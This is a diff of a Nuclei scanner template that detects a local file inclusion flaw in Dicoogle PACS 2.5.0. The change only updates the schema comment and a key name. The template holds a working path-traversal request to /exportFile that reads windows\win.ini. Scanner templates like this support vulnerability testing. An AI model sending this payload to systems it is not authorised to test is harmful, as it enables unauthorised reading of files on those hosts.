@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: dicoogle-pacs-lfi
 info:
   name: Dicoogle PACS 2.5.0 - Local File Inclusion
@@ -13,7 +14,7 @@ info:
     cvss-score: 7.5
     cwe-id: CWE-22
   tags: windows,lfi,dicoogle
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/exportFile?UID=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini"
